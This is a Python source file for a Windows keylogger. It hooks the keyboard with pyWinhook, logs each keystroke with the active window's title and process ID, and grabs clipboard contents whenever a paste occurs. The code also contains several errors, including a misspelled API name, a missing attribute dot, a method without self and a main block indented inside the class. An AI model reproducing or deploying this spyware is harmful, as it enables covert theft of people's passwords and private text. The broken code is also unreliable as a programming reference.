from ctypes import byref, create_string_buffer, c_ulong, windll
from io  import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWinodow() # call a function that returns a handle to the active window on the target desktop.
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # Pass a handle to the function to obtain the ID of that window.
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(
            0x400 | 0x10, False, pid) # open process in this line.
        windll.psapiGetModuleBaseNameA(
            h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(
            hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode() 
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
            print('\n', process_id, executable.value.decode(), self.current_window)

            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')

        return True
    
    def run():
        save_stdout = sys.stdout
        sys.stdout = StringIO()

        kl = KeyLogger()
        hm = pyHook.HookManager()
        hm.KeyDown = kl.mykeystroke
        hm.HookKeyboard()
        while time.thread_time() < TIMEOUT:
            pythoncom.PumpWaitingMessages()

        log = sys.stdout.getvalue()
        sys.stdout = save_stdout
        return log
    
    if __name__ == '__main__':
        print(run())
        print('Done.')